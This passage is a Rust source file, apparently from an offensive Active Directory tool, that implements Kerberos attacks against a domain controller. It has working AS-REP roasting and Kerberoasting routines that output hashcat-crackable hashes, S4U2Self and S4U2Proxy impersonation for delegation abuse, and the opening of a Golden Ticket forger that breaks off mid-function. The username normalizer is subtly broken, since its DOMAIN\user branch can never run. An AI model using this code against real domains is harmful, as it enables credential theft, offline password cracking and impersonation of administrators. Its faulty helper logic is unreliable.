//! Kerberos protocol operations: AS-REQ, TGS-REQ, S4U2Self, S4U2Proxy.
//!
//! Uses `kerberos_asn1` (v0.2) for ASN.1 message construction
//! and `kerberos_crypto` (v0.3) for encryption/decryption.

use crate::error::{OverthroneError, Result};
use crate::proto::ntlm;
use chrono::Utc;
use kerberos_asn1::{
    ApReq, AsRep, AsReq, Asn1Object, Authenticator as KrbAuthenticator, Checksum, EncAsRepPart,
    EncTgsRepPart, EncryptedData, KdcReqBody, KerbPaPacRequest, KerberosFlags, KerberosTime,
    KrbError, PaData, PaEncTsEnc, PaForUser, PrincipalName, TgsRep, TgsReq, Ticket,
};
use kerberos_crypto::new_kerberos_cipher;
use std::net::SocketAddr;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
//  Constants
// ═══════════════════════════════════════════════════════════

pub const KDC_PORT: u16 = 88;

/// Normalize username by stripping @domain suffix if present.
/// This prevents double-domain bugs like "user@domain.com@DOMAIN.COM".
/// Also handles DOMAIN\user format.
pub fn normalize_username(username: &str) -> &str {
    // Handle UPN format: user@domain -> extract user
    if let Some(before_at) = username.split('@').next() {
        return before_at;
    }
    // Handle down-level format: DOMAIN\user -> extract user
    if let Some((_, user)) = username.split_once('\\') {
        return user;
    }
    username
}

/// Normalize realm/domain to uppercase for Kerberos
pub fn normalize_realm(domain: &str) -> String {
    domain.to_uppercase()
}

// Encryption type IDs
pub const ETYPE_RC4_HMAC: i32 = 23;
pub const ETYPE_AES128_CTS: i32 = 17;
pub const ETYPE_AES256_CTS: i32 = 18;

// Principal name types
pub const NT_PRINCIPAL: i32 = 1;
pub const NT_SRV_INST: i32 = 2;

// PA-DATA types
pub const PA_ENC_TIMESTAMP: i32 = 2;
pub const PA_TGS_REQ: i32 = 1;
pub const PA_PAC_REQUEST: i32 = 128;
pub const PA_FOR_USER: i32 = 129;
pub const PA_PAC_OPTIONS: i32 = 167;

// KDC option flag values (big-endian bit positions)
pub const KDC_OPT_FORWARDABLE: u32 = 0x40000000;
pub const KDC_OPT_RENEWABLE: u32 = 0x00800000;
pub const KDC_OPT_RENEWABLE_OK: u32 = 0x00000010;
pub const KDC_OPT_CANONICALIZE: u32 = 0x00010000;
pub const KDC_OPT_CNAME_IN_ADDL_TKT: u32 = 0x00004000;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Supported Kerberos encryption types
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EncType {
    Rc4Hmac,
    Aes128CtsHmacSha1,
    Aes256CtsHmacSha1,
}

impl EncType {
    pub fn to_etype_id(&self) -> i32 {
        match self {
            Self::Rc4Hmac => ETYPE_RC4_HMAC,
            Self::Aes128CtsHmacSha1 => ETYPE_AES128_CTS,
            Self::Aes256CtsHmacSha1 => ETYPE_AES256_CTS,
        }
    }

    pub fn from_etype_id(id: i32) -> Option<Self> {
        match id {
            ETYPE_RC4_HMAC => Some(Self::Rc4Hmac),
            ETYPE_AES128_CTS => Some(Self::Aes128CtsHmacSha1),
            ETYPE_AES256_CTS => Some(Self::Aes256CtsHmacSha1),
            _ => None,
        }
    }
}

/// Holds a Kerberos ticket + session key for reuse across requests
#[derive(Debug, Clone)]
pub struct TicketGrantingData {
    pub ticket: Ticket,
    pub session_key: Vec<u8>,
    pub session_key_etype: i32,
    pub client_principal: String,
    pub client_realm: String,
    pub end_time: Option<KerberosTime>,
}

/// Crackable hash output (hashcat/john compatible)
#[derive(Debug, Clone)]
pub struct CrackableHash {
    pub username: String,
    pub domain: String,
    pub spn: Option<String>,
    pub hash_type: HashType,
    pub hash_string: String,
}

#[derive(Debug, Clone, PartialEq)]
pub enum HashType {
    AsRepRoast,
    Kerberoast,
}

impl std::fmt::Display for CrackableHash {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.hash_string)
    }
}

// ═══════════════════════════════════════════════════════════
//  KDC TCP Transport
// ═══════════════════════════════════════════════════════════

/// Send a Kerberos message over TCP (4-byte BE length prefix + payload)
async fn kdc_send(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
    let len_bytes = (data.len() as u32).to_be_bytes();
    stream.write_all(&len_bytes).await?;
    stream.write_all(data).await?;
    stream.flush().await?;
    Ok(())
}

/// Receive a Kerberos message over TCP
async fn kdc_recv(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).await?;
    let len = u32::from_be_bytes(len_buf) as usize;

    if len > 65535 {
        return Err(OverthroneError::Kerberos(format!(
            "KDC response too large: {len} bytes"
        )));
    }

    let mut data = vec![0u8; len];
    stream.read_exact(&mut data).await?;
    Ok(data)
}

/// Connect to KDC, send request, receive response
async fn kdc_exchange(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> {
    let addr: SocketAddr = format!("{dc_ip}:{KDC_PORT}")
        .parse()
        .map_err(|e| OverthroneError::Kerberos(format!("Invalid KDC address: {e}")))?;

    let mut stream = tokio::time::timeout(
        std::time::Duration::from_secs(10),
        TcpStream::connect(addr),
    )
    .await
    .map_err(|_| OverthroneError::Kerberos(format!("KDC connection timed out after 10s: {addr}")))?
    .map_err(|e| OverthroneError::Kerberos(format!("Cannot reach KDC at {addr}: {e}")))?;

    debug!("Connected to KDC at {addr}");
    kdc_send(&mut stream, request_bytes).await?;
    tokio::time::timeout(
        std::time::Duration::from_secs(15),
        kdc_recv(&mut stream),
    )
    .await
    .map_err(|_| OverthroneError::Kerberos(format!("KDC response timed out after 15s: {addr}")))?
}

// ═══════════════════════════════════════════════════════════
//  Message Builders
// ═══════════════════════════════════════════════════════════

/// Build KDC-REQ-BODY for an AS-REQ
fn build_as_req_body(username: &str, realm: &str, etypes: &[i32]) -> KdcReqBody {
    let cname = PrincipalName {
        name_type: NT_PRINCIPAL,
        name_string: vec![username.to_string()],
    };

    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: vec!["krbtgt".to_string(), realm.to_string()],
    };

    let now = Utc::now();
    let till = now + chrono::Duration::hours(10);

    KdcReqBody {
        kdc_options: kdc_flags(
            KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE | KDC_OPT_RENEWABLE_OK,
        ),
        cname: Some(cname),
        realm: realm.to_string(),
        sname: Some(sname),
        from: None,
        till: KerberosTime::from(till),
        rtime: Some(KerberosTime::from(till)),
        nonce: rand::random::<u32>(),
        etypes: etypes.to_vec(),
        addresses: None,
        enc_authorization_data: None,
        additional_tickets: None,
    }
}

/// Build KDC-REQ-BODY for a TGS-REQ
fn build_tgs_req_body(
    realm: &str,
    sname: PrincipalName,
    etypes: &[i32],
    flags: u32,
    additional_tickets: Option<Vec<Ticket>>,
    cname: Option<PrincipalName>,
) -> KdcReqBody {
    let now = Utc::now();
    let till = now + chrono::Duration::hours(10);

    KdcReqBody {
        kdc_options: kdc_flags(flags),
        cname,
        realm: realm.to_string(),
        sname: Some(sname),
        from: None,
        till: KerberosTime::from(till),
        rtime: None,
        nonce: rand::random::<u32>(),
        etypes: etypes.to_vec(),
        addresses: None,
        enc_authorization_data: None,
        additional_tickets,
    }
}

/// Helper: create KerberosFlags from a u32 bit field
fn kdc_flags(flags: u32) -> KerberosFlags {
    // KerberosFlags.flags is u32 in kerberos_asn1 v0.2
    KerberosFlags { flags }
}

/// Build PA-PAC-REQUEST padata
fn build_pa_pac_request(include_pac: bool) -> PaData {
    let pac_req = KerbPaPacRequest { include_pac };
    PaData {
        padata_type: PA_PAC_REQUEST,
        padata_value: pac_req.build(),
    }
}

/// Build encrypted timestamp for pre-authentication
fn build_pa_enc_timestamp(key: &[u8], etype: i32) -> Result<PaData> {
    let now = Utc::now();
    let timestamp = PaEncTsEnc {
        patimestamp: KerberosTime::from(now),
        pausec: Some(now.timestamp_subsec_micros() as i32),
    };

    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Unsupported etype {etype}: {e}")))?;

    // kerberos_crypto v0.3: encrypt() returns Vec<u8> directly (infallible)
    let encrypted = cipher.encrypt(key, 1, &timestamp.build());

    let enc_data = EncryptedData {
        etype,
        kvno: None,
        cipher: encrypted,
    };

    Ok(PaData {
        padata_type: PA_ENC_TIMESTAMP,
        padata_value: enc_data.build(),
    })
}

/// Build Authenticator encrypted with session key for AP-REQ
fn build_encrypted_authenticator(
    realm: &str,
    cname: &str,
    session_key: &[u8],
    etype: i32,
) -> Result<EncryptedData> {
    let now = Utc::now();

    let authenticator = KrbAuthenticator {
        authenticator_vno: 5,
        crealm: realm.to_string(),
        cname: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![cname.to_string()],
        },
        cksum: None,
        cusec: now.timestamp_subsec_micros() as i32,
        ctime: KerberosTime::from(now),
        subkey: None,
        seq_number: Some(rand::random::<u32>()),
        authorization_data: None,
    };

    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher error: {e}")))?;

    // kerberos_crypto v0.3: encrypt() returns Vec<u8> directly (infallible)
    let encrypted = cipher.encrypt(session_key, 7, &authenticator.build());

    Ok(EncryptedData {
        etype,
        kvno: None,
        cipher: encrypted,
    })
}

/// Build AP-REQ wrapping a ticket + encrypted authenticator
fn build_ap_req(ticket: &Ticket, encrypted_auth: EncryptedData) -> ApReq {
    ApReq {
        pvno: 5,
        msg_type: 14,
        ap_options: KerberosFlags::default(),
        ticket: ticket.clone(),
        authenticator: encrypted_auth,
    }
}

/// Try to parse a KDC response as KRB-ERROR and return a meaningful error
fn parse_krb_error(data: &[u8]) -> OverthroneError {
    match KrbError::parse(data) {
        Ok((_, krb_err)) => {
            let code = krb_err.error_code;
            let base_msg = format!("KRB_ERROR {code}: {}", krb_error_to_string(code));

            // For WRONG_REALM, extract realm hints from the KRB-ERROR response
            if code == 68 {
                // KDC_ERR_WRONG_REALM — the KDC often includes the correct realm
                let suggested_realm =
                    krb_err.crealm.as_ref().map(|r| r.to_string()).or_else(|| {
                        // Fall back to the service realm from the error
                        let r = krb_err.realm.to_string();
                        if !r.is_empty() { Some(r) } else { None }
                    });

                return if let Some(ref realm) = suggested_realm {
                    OverthroneError::Kerberos(format!(
                        "{base_msg}. Did you mean '{realm}'? Try: --domain {realm}\n\
                         Hint: verify realm with: nslookup -type=SRV _ldap._tcp.dc._msdcs.{realm}",
                        realm = realm
                    ))
                } else {
                    OverthroneError::Kerberos(format!(
                        "{base_msg}. The specified realm/domain is incorrect.\n\
                         Hint: verify realm with: nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>"
                    ))
                };
            }

            OverthroneError::Kerberos(base_msg)
        }
        Err(_) => OverthroneError::Kerberos("Failed to parse KDC response".to_string()),
    }
}

// ═══════════════════════════════════════════════════════════
//  AS-REP Roasting (no pre-auth required)
// ═══════════════════════════════════════════════════════════

/// Perform AS-REP Roasting against a user with DONT_REQ_PREAUTH.
/// Returns a hashcat-mode-18200 compatible hash string.
pub async fn asrep_roast(dc_ip: &str, domain: &str, username: &str) -> Result<CrackableHash> {
    let realm = normalize_realm(domain);
    let clean_username = normalize_username(username);
    info!("AS-REP Roasting: {clean_username}@{realm} via {dc_ip}");

    // AS-REQ WITHOUT pre-auth (no PA-ENC-TIMESTAMP)
    let req_body = build_as_req_body(clean_username, &realm, &[ETYPE_RC4_HMAC]);

    let as_req = AsReq {
        pvno: 5,
        msg_type: 10,
        padata: Some(vec![build_pa_pac_request(true)]),
        req_body,
    };

    let response_bytes = kdc_exchange(dc_ip, &as_req.build()).await?;

    match AsRep::parse(&response_bytes) {
        Ok((_, as_rep)) => {
            let enc_part = &as_rep.enc_part;
            let cipher = &enc_part.cipher;

            // Hashcat mode 18200 format:
            // $krb5asrep$23$user@realm:<checksum_32hex>$<edata2_hex>
            // RC4: checksum = first 16 bytes; AES256: first 12 bytes
            let cksum_len = if enc_part.etype == ETYPE_RC4_HMAC { 16 } else { 12 };
            let (checksum, edata2) = cipher.split_at(std::cmp::min(cksum_len, cipher.len()));
            let hash_string = format!(
                "$krb5asrep${}${}@{}:{}${}",
                enc_part.etype,
                username,
                realm,
                hex::encode(checksum),
                hex::encode(edata2),
            );

            info!("AS-REP hash obtained for {username}");
            Ok(CrackableHash {
                username: username.to_string(),
                domain: domain.to_string(),
                spn: None,
                hash_type: HashType::AsRepRoast,
                hash_string,
            })
        }
        Err(_) => Err(parse_krb_error(&response_bytes)),
    }
}

// ═══════════════════════════════════════════════════════════
//  TGT Request (with pre-authentication)
// ═══════════════════════════════════════════════════════════

/// Request a TGT via AS-REQ with PA-ENC-TIMESTAMP pre-auth.
/// `secret` is either a password or NT hash (set `use_hash=true`).
pub async fn request_tgt(
    dc_ip: &str,
    domain: &str,
    username: &str,
    secret: &str,
    use_hash: bool,
) -> Result<TicketGrantingData> {
    let realm = normalize_realm(domain);
    let clean_username = normalize_username(username);
    info!("Requesting TGT for {clean_username}@{realm}");

    let (key, etype) = if use_hash {
        (ntlm::parse_ntlm_hash(secret)?, ETYPE_RC4_HMAC)
    } else {
        (ntlm::nt_hash(secret), ETYPE_RC4_HMAC)
    };

    let pa_timestamp = build_pa_enc_timestamp(&key, etype)?;
    let pa_pac = build_pa_pac_request(true);
    let req_body = build_as_req_body(clean_username, &realm, &[etype]);

    let as_req = AsReq {
        pvno: 5,
        msg_type: 10,
        padata: Some(vec![pa_timestamp, pa_pac]),
        req_body,
    };

    let response_bytes = kdc_exchange(dc_ip, &as_req.build()).await?;

    let (_, as_rep) =
        AsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;

    // Decrypt enc-part to extract session key
    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;

    // kerberos_crypto v0.3: decrypt() returns Result
    let decrypted = cipher
        .decrypt(&key, 3, &as_rep.enc_part.cipher)
        .map_err(|e| OverthroneError::Kerberos(format!("AS-REP decrypt failed: {e}")))?;

    let (_, enc_part) = EncAsRepPart::parse(&decrypted)
        .map_err(|e| OverthroneError::Kerberos(format!("Parse EncAsRepPart: {e}")))?;

    info!(
        "TGT obtained for {username}@{realm} (etype: {})",
        enc_part.key.keytype
    );

    Ok(TicketGrantingData {
        ticket: as_rep.ticket,
        session_key: enc_part.key.keyvalue.clone(),
        session_key_etype: enc_part.key.keytype,
        client_principal: username.to_string(),
        client_realm: realm,
        end_time: Some(enc_part.endtime),
    })
}

// ═══════════════════════════════════════════════════════════
//  Kerberoasting (TGS-REQ for target SPN)
// ═══════════════════════════════════════════════════════════

/// Request a service ticket for an SPN and extract the crackable hash.
/// Requires a valid TGT from `request_tgt()`.
pub async fn kerberoast(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    target_spn: &str,
) -> Result<CrackableHash> {
    info!("Kerberoasting SPN: {target_spn}");
    let realm = &tgt.client_realm;

    // Parse SPN "service/host" into PrincipalName
    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    // Build AP-REQ (ticket + authenticator)
    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let pa_tgs = PaData {
        padata_type: PA_TGS_REQ,
        padata_value: ap_req.build(),
    };

    let req_body = build_tgs_req_body(
        realm,
        sname,
        &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS],
        KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
        None,
        None,
    );

    let tgs_req = TgsReq {
        pvno: 5,
        msg_type: 12,
        padata: Some(vec![pa_tgs]),
        req_body,
    };

    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;

    let (_, tgs_rep) =
        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;

    // Extract encrypted part of the SERVICE TICKET for offline cracking.
    // Hashcat expects the cipher split into checksum and encrypted data:
    //   RC4  (mode 13100): $krb5tgs$23$*user$realm$spn*$<checksum_32hex>$<edata2_hex>
    //     checksum = first 16 bytes of cipher
    //   AES256 (mode 19700): $krb5tgs$18$user$realm$*spn*$<checksum_24hex>$<edata2_hex>
    //     checksum = first 12 bytes of cipher
    //   AES128 (mode 19600): same structure with etype 17
    let enc_part = &tgs_rep.ticket.enc_part;
    let cipher = &enc_part.cipher;

    let hash_string = match enc_part.etype {
        ETYPE_RC4_HMAC => {
            // RC4: 16-byte HMAC-MD5 checksum + encrypted data
            let (checksum, edata2) = cipher.split_at(std::cmp::min(16, cipher.len()));
            format!(
                "$krb5tgs${}$*{}${}${}*${}${}",
                enc_part.etype,
                tgt.client_principal,
                realm,
                target_spn,
                hex::encode(checksum),
                hex::encode(edata2),
            )
        }
        ETYPE_AES256_CTS => {
            // AES256: 12-byte HMAC-SHA1-96 checksum + encrypted data
            let (checksum, edata2) = cipher.split_at(std::cmp::min(12, cipher.len()));
            format!(
                "$krb5tgs${}${}${}$*{}*${}${}",
                enc_part.etype,
                tgt.client_principal,
                realm,
                target_spn,
                hex::encode(checksum),
                hex::encode(edata2),
            )
        }
        etype => {
            // AES128 or other: same 12-byte checksum split
            let (checksum, edata2) = cipher.split_at(std::cmp::min(12, cipher.len()));
            format!(
                "$krb5tgs${}${}${}${}${}${}",
                etype,
                tgt.client_principal,
                realm,
                target_spn,
                hex::encode(checksum),
                hex::encode(edata2),
            )
        }
    };

    info!(
        "Kerberoast hash for {target_spn} (etype: {})",
        enc_part.etype
    );
    Ok(CrackableHash {
        username: tgt.client_principal.clone(),
        domain: realm.to_string(),
        spn: Some(target_spn.to_string()),
        hash_type: HashType::Kerberoast,
        hash_string,
    })
}

/// Request a service ticket (TGS) for an arbitrary SPN and return
/// the decrypted ticket + session key as TicketGrantingData.
///
/// This is the generic "give me a usable service ticket" function,
/// as opposed to `kerberoast()` which only extracts the crackable hash.
///
/// Requires a valid TGT from `request_tgt()`.
pub async fn request_service_ticket(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    target_spn: &str,
) -> Result<TicketGrantingData> {
    let realm = &tgt.client_realm;
    info!("Requesting service ticket for SPN: {target_spn}");

    // Parse SPN "service/host" into PrincipalName
    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    // Build AP-REQ (TGT ticket + authenticator encrypted with TGT session key)
    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let pa_tgs = PaData {
        padata_type: PA_TGS_REQ,
        padata_value: ap_req.build(),
    };

    // Build TGS-REQ body targeting the SPN
    let req_body = build_tgs_req_body(
        realm,
        sname,
        &[
            tgt.session_key_etype,
            ETYPE_RC4_HMAC,
            ETYPE_AES256_CTS,
            ETYPE_AES128_CTS,
        ],
        KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
        None,
        None,
    );

    let tgs_req = TgsReq {
        pvno: 5,
        msg_type: 12,
        padata: Some(vec![pa_tgs]),
        req_body,
    };

    // Exchange with KDC
    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;

    // Parse TGS-REP
    let (_, tgs_rep) =
        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;

    // Decrypt enc-part with TGT session key (key usage 8 for TGS-REP)
    let cipher = new_kerberos_cipher(tgt.session_key_etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;

    let decrypted = cipher
        .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
        .map_err(|e| OverthroneError::Kerberos(format!("TGS-REP decrypt failed: {e}")))?;

    let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
        .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;

    info!(
        "Service ticket for {target_spn} obtained (etype: {})",
        enc_tgs.key.keytype
    );

    Ok(TicketGrantingData {
        ticket: tgs_rep.ticket,
        session_key: enc_tgs.key.keyvalue,
        session_key_etype: enc_tgs.key.keytype,
        client_principal: tgt.client_principal.clone(),
        client_realm: realm.to_string(),
        end_time: Some(enc_tgs.endtime),
    })
}

// ═══════════════════════════════════════════════════════════
//  S4U2Self — Impersonate any user to ourselves
// ═══════════════════════════════════════════════════════════

/// S4U2Self: Request a service ticket on behalf of another user.
/// Used in constrained delegation attacks.
pub async fn s4u2self(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    impersonate_user: &str,
) -> Result<TicketGrantingData> {
    let realm = &tgt.client_realm;
    let clean_impersonate_user = normalize_username(impersonate_user);
    info!("S4U2Self: impersonating {clean_impersonate_user}@{realm}");

    // Build PA-FOR-USER
    let pa_for_user_data = PaForUser {
        username: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![clean_impersonate_user.to_string()],
        },
        userrealm: realm.to_string(),
        cksum: build_s4u2self_checksum(clean_impersonate_user, realm, &tgt.session_key),
        auth_package: "Kerberos".to_string(),
    };

    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let sname = PrincipalName {
        name_type: NT_PRINCIPAL,
        name_string: vec![tgt.client_principal.clone()],
    };

    let req_body = build_tgs_req_body(
        realm,
        sname,
        &[tgt.session_key_etype],
        KDC_OPT_FORWARDABLE,
        None,
        Some(PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![tgt.client_principal.clone()],
        }),
    );

    let tgs_req = TgsReq {
        pvno: 5,
        msg_type: 12,
        padata: Some(vec![
            PaData {
                padata_type: PA_TGS_REQ,
                padata_value: ap_req.build(),
            },
            PaData {
                padata_type: PA_FOR_USER,
                padata_value: pa_for_user_data.build(),
            },
        ]),
        req_body,
    };

    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;

    let (_, tgs_rep) =
        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;

    let cipher = new_kerberos_cipher(tgt.session_key_etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;

    let decrypted = cipher
        .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
        .map_err(|e| OverthroneError::Kerberos(format!("S4U2Self decrypt: {e}")))?;

    let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
        .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;

    info!("S4U2Self ticket for {impersonate_user} obtained");
    Ok(TicketGrantingData {
        ticket: tgs_rep.ticket,
        session_key: enc_tgs.key.keyvalue,
        session_key_etype: enc_tgs.key.keytype,
        client_principal: impersonate_user.to_string(),
        client_realm: realm.to_string(),
        end_time: Some(enc_tgs.endtime),
    })
}

// ═══════════════════════════════════════════════════════════
//  S4U2Proxy — Forward to target service
// ═══════════════════════════════════════════════════════════

/// S4U2Proxy: Use an S4U2Self ticket to get a ticket for a target service SPN.
pub async fn s4u2proxy(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    s4u2self_ticket: &TicketGrantingData,
    target_spn: &str,
) -> Result<TicketGrantingData> {
    let realm = &tgt.client_realm;
    info!(
        "S4U2Proxy: {target_spn} as {}",
        s4u2self_ticket.client_principal
    );

    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let req_body = build_tgs_req_body(
        realm,
        sname,
        &[tgt.session_key_etype],
        KDC_OPT_FORWARDABLE | KDC_OPT_CANONICALIZE | KDC_OPT_CNAME_IN_ADDL_TKT,
        Some(vec![s4u2self_ticket.ticket.clone()]),
        Some(PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![tgt.client_principal.clone()],
        }),
    );

    let tgs_req = TgsReq {
        pvno: 5,
        msg_type: 12,
        padata: Some(vec![PaData {
            padata_type: PA_TGS_REQ,
            padata_value: ap_req.build(),
        }]),
        req_body,
    };

    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;

    let (_, tgs_rep) =
        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;

    let cipher = new_kerberos_cipher(tgt.session_key_etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;

    let decrypted = cipher
        .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
        .map_err(|e| OverthroneError::Kerberos(format!("S4U2Proxy decrypt: {e}")))?;

    let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
        .map_err(|e| OverthroneError::Kerberos(format!("Parse: {e}")))?;

    info!("S4U2Proxy ticket for {target_spn} obtained");
    Ok(TicketGrantingData {
        ticket: tgs_rep.ticket,
        session_key: enc_tgs.key.keyvalue,
        session_key_etype: enc_tgs.key.keytype,
        client_principal: s4u2self_ticket.client_principal.clone(),
        client_realm: realm.to_string(),
        end_time: Some(enc_tgs.endtime),
    })
}

// ═══════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════

/// Build HMAC-MD5 checksum for S4U2Self PA-FOR-USER
fn build_s4u2self_checksum(username: &str, realm: &str, session_key: &[u8]) -> Checksum {
    use hmac::{Hmac, Mac};

    let mut data: Vec<u8> = Vec::new();
    data.extend_from_slice(&(NT_PRINCIPAL as u32).to_le_bytes());
    data.extend_from_slice(username.as_bytes());
    data.extend_from_slice(realm.as_bytes());
    data.extend_from_slice(b"Kerberos");

    let mut mac = Hmac::<md5::Md5>::new_from_slice(session_key).expect("HMAC-MD5 accepts any key");
    mac.update(&data);
    let result = mac.finalize().into_bytes();

    Checksum {
        cksumtype: -138, // HMAC-MD5 for S4U
        checksum: result.to_vec(),
    }
}

/// Map common Kerberos error codes to human-readable strings
pub fn krb_error_to_string(code: i32) -> &'static str {
    match code {
        0 => "KDC_ERR_NONE",
        6 => "KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found",
        7 => "KDC_ERR_S_PRINCIPAL_UNKNOWN - Server not found",
        12 => "KDC_ERR_POLICY - KDC policy rejects request",
        14 => "KDC_ERR_ETYPE_NOSUPP - Etype not supported",
        18 => "KDC_ERR_CLIENT_REVOKED - Credentials revoked",
        23 => "KDC_ERR_KEY_EXPIRED - Password expired",
        24 => "KDC_ERR_PREAUTH_FAILED - Pre-auth failed (wrong password/hash)",
        25 => "KDC_ERR_PREAUTH_REQUIRED - Pre-auth required",
        31 => "KRB_AP_ERR_SKEW - Clock skew too great",
        32 => "KRB_AP_ERR_BADADDR - Incorrect network address",
        37 => "KRB_AP_ERR_MODIFIED - Message stream modified",
        41 => "KRB_ERR_RESPONSE_TOO_BIG - Response too big for UDP",
        50 => "KDC_ERR_BADOPTION - Bad option in request",
        60 => "KRB_ERR_GENERIC - Generic error",
        68 => "KDC_ERR_WRONG_REALM - Wrong realm",
        _ => "UNKNOWN_ERROR",
    }
}
// ═══════════════════════════════════════════════════════════
// Ticket Forging — Golden & Silver Tickets
// ═══════════════════════════════════════════════════════════

/// Forge a TGT (Golden Ticket) using the krbtgt NTLM hash.
///
/// This creates a valid TGT without contacting the KDC by encrypting
/// a crafted EncTicketPart (with PAC) using the krbtgt key.
///
/// # Arguments
/// * `domain`     - Target domain (e.g., "corp.local")
/// * `domain_sid` - Domain SID (e.g., "S-1-5-21-...")
/// * `username`   - User to impersonate (e.g., "Administrator")
/// * `user_rid`   - RID of the user (500 for Administrator)
/// * `krbtgt_key`  - Raw krbtgt NTLM hash bytes (16 bytes for RC4)
/// * `etype`      - Encryption type (ETYPE_RC4_HMAC recommended)
pub fn forge_tgt(
    domain: &str,
    domain_sid: &str,
    username: &str,
    user_rid: u32,
    krbtgt_key: &[u8],
    etype: i32,
) -> Result<TicketGrantingData> {
    let realm = domain.to_uppercase();
    info!(
        "Forging Golden Ticket: {}@{} (RID={}, etype={})",
        username, realm, user_rid, etype
    );

    // Generate a random session key (same length as the etype key)
    let session_key = generate_session_key(etype);

    // Build the PAC (Privilege Attribute Certificate)
    let pac_bytes = build_minimal_pac(domain_sid, username, user_rid, &realm);

    // Build EncTicketPart
    let now = Utc::now();
    let endtime = now + chrono::Duration::hours(10);
    let renew_till = now + chrono::Duration::days(7);

    let enc_ticket_part = build_enc_ticket_part(
        username,
        &realm,
        &session_key,
        etype,
        &now,
        &endtime,
        &renew_till,
        &pac_bytes,
    );

    // Encrypt EncTicketPart with krbtgt key (key_usage = 2)
    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;
    let encrypted = cipher.encrypt(krbtgt_key, 2, &enc_ticket_part);

    // Build the Ticket ASN.1 structure
    let ticket = Ticket {
        tkt_vno: 5,
        realm: realm.clone(),
        sname: PrincipalName {
            name_type: NT_SRV_INST,
            name_string: vec!["krbtgt".to_string(), realm.clone()],
        },
        enc_part: EncryptedData {
            etype,
            kvno: Some(2), // krbtgt kvno is typically 2
            cipher: encrypted,
        },
    };

    info!(
